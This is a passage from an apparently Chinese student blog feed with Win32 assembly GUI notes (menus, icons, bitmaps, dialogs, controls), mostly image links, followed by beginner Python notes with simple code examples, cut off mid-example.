alt="image-20230717174312970"></p><p>区别：</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717174402830.png" alt="image-20230717174402830"></p></li><li><p>添加系统菜单</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717174850382.png" alt="image-20230717174850382"></p></li><li><p>右键弹出菜单</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717174937533.png" alt="image-20230717174937533"></p></li><li><p>二级菜单</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717175138449.png" alt="image-20230717175138449"></p></li><li><p>获取鼠标的位置</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717175240029.png" alt="image-20230717175240029"></p></li><li><p>菜单窗台的检测</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717175615607.png" alt="image-20230717175615607"></p></li></ol><h2 id="图标和光标"><a href="#图标和光标" class="headerlink" title="图标和光标"></a>图标和光标</h2><ol><li><p>定义</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718083711673.png" alt="image-20230718083711673"></p></li><li><p>装载图标和光标</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718083931575.png" alt="image-20230718083931575"></p><p>通过发送信息</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718084236722.png" alt="image-20230718084236722"></p></li><li><p>改变窗口的属性然后改变光标的设定</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718084346721.png" alt="image-20230718084346721"></p></li></ol><h2 id="位图"><a href="#位图" class="headerlink" title="位图"></a>位图</h2><ol><li><p>是一种存储方式</p><p>linux也是这种</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718084711472.png" alt="image-20230718084711472"></p></li><li><p>矢量和位图的关系</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718084955790.png" alt="image-20230718084955790"></p></li><li><p>区分位图，设备无关位图，位图文件</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718085112936.png" alt="image-20230718085112936"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718085332659.png" alt="image-20230718085332659"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718085306650.png" alt="image-20230718085306650"></p></li><li><p>在资源中定义位图</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718085919241.png" alt="image-20230718085919241"></p></li></ol><h2 id="对话框"><a href="#对话框" class="headerlink" title="对话框"></a>对话框</h2><ol><li><p>模态对话框和非模块对话框</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718090141825.png" alt="image-20230718090141825">相当于特殊的窗口</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718090259854.png" alt="image-20230718090259854"></p></li><li><p>对话框的创建</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718091807097.png" alt="image-20230718091807097"></p></li><li><p>tab停留位</p><p>就是使用tab经行焦点的转变</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718092232261.png" alt="image-20230718092232261"></p></li><li><p>使用对话框</p><ul><li><p>创建部分和对话框过程（回调函数）的部分</p></li><li><p>创建模态对话框</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718092717495.png" alt="image-20230718092717495"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718092900612.png" alt="image-20230718092900612"></p></li><li><p>结束模态对话框</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718093002726.png" alt="image-20230718093002726"></p></li><li><p>创建非模块对话框</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718093104742.png" alt="image-20230718093104742"></p></li><li><p>两个创建函数的不同</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718093413292.png" alt="image-20230718093413292"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718093437707.png" alt="image-20230718093437707"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718093446473.png" alt="image-20230718093446473"></p></li></ul></li></ol><h2 id="使用子窗口控件"><a href="#使用子窗口控件" class="headerlink" title="使用子窗口控件"></a>使用子窗口控件</h2><h2 id="子窗口的控件"><a href="#子窗口的控件" class="headerlink" title="子窗口的控件"></a>子窗口的控件</h2><ol><li><p>定义</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718103357430.png" alt="image-20230718103357430"></p></li><li><p>通用的使用方法</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718104005759.png" alt="image-20230718104005759"></p><ul><li><p>通过id获取句柄</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718104141640.png" alt="image-20230718104141640"></p></li><li><p>向控件发送信息</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718104314711.png" alt="image-20230718104314711"></p><p>其中的换行符出现了错误</p></li><li><p>使用单选钮和复选框</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718104605311.png" alt="image-20230718104605311"></p></li><li><p>使用静态控件</p><p>不向对话框发送信息</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718105309632.png" alt="image-20230718105309632"></p><p>可以用来构造简单的线条图形</p></li><li><p>使用文本编辑控件</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718111110387.png" alt="image-20230718111110387"></p></li><li><p>使用滚动条、</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718112856487.png" alt="image-20230718112856487"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718112937397.png" alt="image-20230718112937397"></p><p>发送信息获取返回</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718113658053.png" alt="image-20230718113658053"></p></li></ul></li></ol><h2 id="字符串资源"><a href="#字符串资源" class="headerlink" title="字符串资源"></a>字符串资源</h2>]]></content>
    
    
    
    <tags>
      
      <tag>汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>py速成学习</title>
    <link href="/2023/07/13/python/py%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/07/13/python/py%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><h2 id="print"><a href="#print" class="headerlink" title="print"></a>print</h2><ol><li><p>使用print</p><ul><li><p>hello world</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hello world&quot;</span>)<br></code></pre></td></tr></table></figure><p>值得注意的是使用py的打印函数是<code>printf</code>并没有<code>f</code></p><p>py是一门脚本语言所以我们写一句话也是可以运行出结果的</p></li><li><p>字符串怕拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hello&quot;</span>+<span class="hljs-string">&quot; world&quot;</span>)<br></code></pre></td></tr></table></figure></li><li><p>换行和打印多行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;&quot;床前明月光，</span><br><span class="hljs-string">疑是地上霜。 </span><br><span class="hljs-string">举头望明月，</span><br><span class="hljs-string">低头思故乡。&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>这个是和c不同的</p></li></ul></li></ol><h2 id="赋值和创建一个变量"><a href="#赋值和创建一个变量" class="headerlink" title="赋值和创建一个变量"></a>赋值和创建一个变量</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span>=<span class="hljs-string">&quot;this is a string&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>str1 = <span class="hljs-string">&quot;string &quot;</span><br>str2=str1<br><span class="hljs-built_in">print</span>(str1) <span class="hljs-comment"># string</span><br></code></pre></td></tr></table></figure><h2 id="运算符知识"><a href="#运算符知识" class="headerlink" title="运算符知识"></a>运算符知识</h2><ol><li><p>基本和C语言一致</p></li><li><p>不同或补充</p><ul><li><p><code>**</code>乘方符号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">2</span>**<span class="hljs-number">3</span>  <span class="hljs-comment"># 2的3次方</span><br></code></pre></td></tr></table></figure></li></ul></li></ol><h2 id="导入库"><a href="#导入库" class="headerlink" title="导入库"></a>导入库</h2><ol><li><p>使用<code>import</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 例如</span><br><span class="hljs-keyword">import</span> math<br><span class="hljs-comment"># 导入math的库，这个库是与数学计算有关的库</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> sin<br><span class="hljs-comment"># 从math中导入sin</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="基础数据类型"><a href="#基础数据类型" class="headerlink" title="基础数据类型"></a>基础数据类型</h2><ol><li><p>字符串</p><p>基本和c++一样</p><ul><li><p><code>len</code></p><p>求字符串长度</p></li><li><p><code>[]</code></p><p>使用索引得到字符</p></li></ul></li><li><p>浮点型只有<code>float</code></p></li><li><p>布尔类型</p><p>必须是大写开始</p><p><code>True</code></p><p><code>False</code></p></li><li><p>使用type()打印当前变量的类型</p></li></ol><h2 id="获取用户的输入"><a href="#获取用户的输入" class="headerlink" title="获取用户的输入"></a>获取用户的输入</h2><ol><li><p>使用<code>input</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">int_num=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入一个整数：&quot;</span>))<br><span class="hljs-built_in">print</span>(int_num)<br></code></pre></td></tr></table></figure><p>使用input读取用户的输入是一个string，所以我们使用int()函数转换成int才是我们需要的Int_num</p><p>同样的转换函数还有很多比如<code>float</code>等都是将</p></li></ol><h2 id="判断语句"><a href="#判断语句" class="headerlink" title="判断语句"></a>判断语句</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 判断语句</span><br><br><span class="hljs-comment"># is_true=bool(input(&quot;input bool:&quot;))</span><br>int_num=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input a num:&quot;</span>))<br><br><br><span class="hljs-keyword">if</span> int_num&lt;<span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&lt;0&quot;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-number">0</span>&lt;=int_num&lt;<span class="hljs-number">100</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&lt;=0 and &lt;100&quot;</span>) <span class="hljs-comment"># 请注意判断的写法</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&gt;=100&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h2><ol><li><p>与C语言不一样</p><ul><li><code>and</code> 与  &#x3D;&#x3D; <code>&amp;</code></li><li><code>or</code> 或 &#x3D;&#x3D;<code>|</code></li><li><code>not</code>  非 &#x3D;&#x3D;<code>!</code></li></ul><p>所谓的不同都是符号发生了变化，本质并没有很大的变化</p></li></ol><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><ol><li><p>列表是可变的</p></li><li><p>创建和使用列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 列表</span><br>   <br><span class="hljs-built_in">list</span>=[<span class="hljs-string">&quot;信安&quot;</span>,<span class="hljs-string">&quot;实验班&quot;</span>,<span class="hljs-string">&quot;物理网&quot;</span>,<span class="hljs-string">&quot;网工&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br><span class="hljs-comment"># 添加元素</span><br><span class="hljs-built_in">list</span>.append(<span class="hljs-string">&quot;网安&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br><span class="hljs-comment"># 删除元素</span><br><span class="hljs-built_in">list</span>.remove(<span class="hljs-string">&quot;网安&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br><span class="hljs-comment"># 求长度</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>))<br><span class="hljs-comment"># 通过索引得到元素</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>[<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure></li></ol><h2 id="键值对的使用"><a href="#键值对的使用" class="headerlink" title="键值对的使用"></a>键值对的使用</h2> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"> <br><span class="hljs-comment"># 普通的键值对</span><br>key_value1=&#123;<span class="hljs-string">&quot;chg&quot;</span>:<span class="hljs-number">1</span>,<br>            <span class="hljs-string">&quot;zjy&quot;</span>:<span class="hljs-number">2</span>,<br>            <span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">3</span>&#125;<br><span class="hljs-built_in">print</span>(key_value1[<span class="hljs-string">&quot;chg&quot;</span>])<br> <br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(key_value1))<span class="hljs-comment"># 有几个键值对</span><br>key_value1[<span class="hljs-string">&quot;test2&quot;</span>]=<span class="hljs-number">4</span> <span class="hljs-comment"># 添加键值对</span><br><span class="hljs-built_in">print</span>(key_value1[<span class="hljs-string">&quot;test2&quot;</span>])<br> <br><span class="hljs-comment"># 判断是否存在</span><br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxx&quot;</span> <span class="hljs-keyword">in</span> key_value1:<br>    <span class="hljs-built_in">print</span>(key_value1[<span class="hljs-string">&quot;chg&quot;</span>])<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;don&#x27;t hava&quot;</span>)<br>    <br><span class="hljs-comment"># 加入元组的键值对，元组不可更改</span><br>key_value2=&#123;(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;chg&quot;</span>):<span class="hljs-string">&quot;man&quot;</span>,<br>            (<span class="hljs-number">2</span>,<span class="hljs-string">&quot;test1&quot;</span>):<span class="hljs-string">&quot;man&quot;</span>,<br>            (<span class="hljs-number">3</span>,<span class="hljs-string">&quot;test2&quot;</span>):<span class="hljs-string">&quot;woman&quot;</span>&#125;<br> <br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> key_value2.items():<br>    <span class="hljs-built_in">print</span>(k)<br></code></pre></td></tr></table></figure><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><ul><li><p><code>for</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 键值对和元组的使用</span><br>  <br><span class="hljs-comment"># 普通的键值对</span><br>key_value1=&#123;<span class="hljs-string">&quot;chg&quot;</span>:<span class="hljs-number">1</span>,<br>            <span class="hljs-string">&quot;zjy&quot;</span>:<span class="hljs-number">2</span>,<br>            <span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">3</span>&#125;<br><span class="hljs-built_in">print</span>(key_value1[<span class="hljs-string">&quot;chg&quot;</span>])<br>  <br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(key_value1))<span class="hljs-comment"># 有几个键值对</span><br>key_value1[<span class="hljs-string">&quot;test2&quot;</span>]=<span class="hljs-number">4</span> <span class="hljs-comment"># 添加键值对</span><br><span class="hljs-built_in">print</span>(key_value1[<span class="hljs-string">&quot;test2&quot;</span>])<br>  <br><span class="hljs-comment"># 判断是否存在</span><br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxx&quot;</span> <span class="hljs-keyword">in</span> key_value1:<br>    <span class="hljs-built_in">print</span>(key_value1[<span class="hljs-string">&quot;chg&quot;</span>])<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;don&#x27;t hava&quot;</span>)<br>  <br>  <br><span class="hljs-comment"># 使用循环打印键值对</span><br><span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> key_value1.keys(): <span class="hljs-comment"># .key()方法是读取出所有的key。还有/value是读取所有值。使用.item是读取所有的键值对</span><br>    <span class="hljs-built_in">print</span>(name)<br>  <br>  <br><span class="hljs-keyword">for</span> key_value <span class="hljs-keyword">in</span> key_value1.items():<span class="hljs-comment">#读取出来是一个元组</span><br>    <span class="hljs-built_in">print</span>(key_value)<br><span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> key_value1.values():<br>    <span class="hljs-built_in">print</span>(num)<br>    <br>   <br>total = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">101</span>): <span class="hljs-comment"># 范围是0~100，括号左边的取不到 range()还有第三个参数表示步长</span><br>    total+=i<br>  <br><span class="hljs-built_in">print</span>(total)<br>  <br></code></pre></td></tr></table></figure></li><li><p><code>while()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">is_true=<span class="hljs-literal">True</span><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> is_true:<br>   i+=<span class="hljs-number">1</span><br>   <span class="hljs-keyword">if</span> i==<span class="hljs-number">100</span> :<br>       is_true=<span class="hljs-literal">False</span><br>  <br>  <br><span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure></li></ul><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">name=<span class="hljs-string">&quot;chg&quot;</span><br>school=<span class="hljs-string">&quot;CUIT&quot;</span><br>string_test1=<span class="hljs-string">&quot;&quot;&quot;&#123;name&#125; is a student in &#123;school&#125;&quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(name=name,school=school)<br><span class="hljs-built_in">print</span>(string_test1)<br><br>string_test2=<span class="hljs-string">&quot;this is a test &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&quot;string&quot;</span>)<br><span class="hljs-built_in">print</span>(string_test2)<br></code></pre></td></tr></table></figure><p><img src="https://python-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0image-20230714093050803.png" alt="image-20230714093050803"></p><h2 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a,b</span>):<br>    <span class="hljs-keyword">return</span> a+b<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(add(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)))<br></code></pre></td></tr></table></figure><h2 id="导入第三方库"><a href="#导入第三方库" class="headerlink" title="导入第三方库"></a>导入第三方库</h2><ol><li>通过<code>pypi.org</code>网站查看库</li><li>通过<code>pip install 仓库名</code>安装</li><li>使用<code>import</code>引入</li></ol><h2 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2><ol><li><p>使用对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">   <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,<span class="hljs-built_in">id</span>,name</span>):<br>        self.<span class="hljs-built_in">id</span>=<span class="hljs-built_in">id</span><br>        self.name=name<br>        self.grades=&#123;<span class="hljs-string">&quot;语文&quot;</span>:<span class="hljs-number">0</span>,<br>                     <span class="hljs-string">&quot;数学&quot;</span>:<span class="hljs-number">1</span>,<br>                     <span class="hljs-string">&quot;英语&quot;</span>:<span class="hljs-number">2</span>&#125;<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">set_grades</span>(<span class="hljs-params">self,course,grade</span>):<br>        <span class="hljs-keyword">if</span> course <span class="hljs-keyword">in</span> self.grades:<br>            self.grades[course]=grade<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">print_grades</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">for</span> course <span class="hljs-keyword">in</span> self.grades:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;course&#125;</span>的成绩是<span class="hljs-subst">&#123;self.grades[course]&#125;</span>&quot;</span>)<br>   <br>chg=Student(<span class="hljs-string">&quot;10010&quot;</span>,<span class="hljs-string">&quot;chg&quot;</span>)<br><span class="hljs-built_in">print</span>(chg.<span class="hljs-built_in">id</span>)<br><span class="hljs-built_in">print</span>(chg.grades)<br>chg.set_grades(<span class="hljs-string">&quot;数学&quot;</span>,<span class="hljs-number">122</span>)<br><span class="hljs-built_in">print</span>(chg.grades)<br>chg.print_grades()<br></code></pre></td></tr></table></figure></li><li><p>继承</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,<span class="hljs-built_in">id</span>,name</span>):<br>        self.<span class="hljs-built_in">id</span>=<span class="hljs-built_in">id</span><br>        self.name=name<br>        self.grades=&#123;<span class="hljs-string">&quot;语文&quot;</span>:<span class="hljs-number">0</span>,<br>                     <span class="hljs-string">&quot;数学&quot;</span>:<span class="hljs-number">1</span>,<br>                     <span class="hljs-string">&quot;英语&quot;</span>:<span class="hljs-number">2</span>&#125;<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">set_grades</span>(<span class="hljs-params">self,course,grade</span>):<br>        <span class="hljs-keyword">if</span> course <span class="hljs-keyword">in</span> self.grades:<br>            self.grades[course]=grade<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">print_grades</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">for</span> course <span class="hljs-keyword">in</span> self.grades:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;course&#125;</span>的成绩是<span class="hljs-subst">&#123;self.grades[course]&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_homework</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;做作业&quot;</span>)<br>   <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pupils</span>(<span class="hljs-title class_ inherited__">Student</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,<span class="hljs-built_in">id</span>,name,other_subjects</span>):<br>        <span class="hljs-built_in">super</span>().__init__(<span 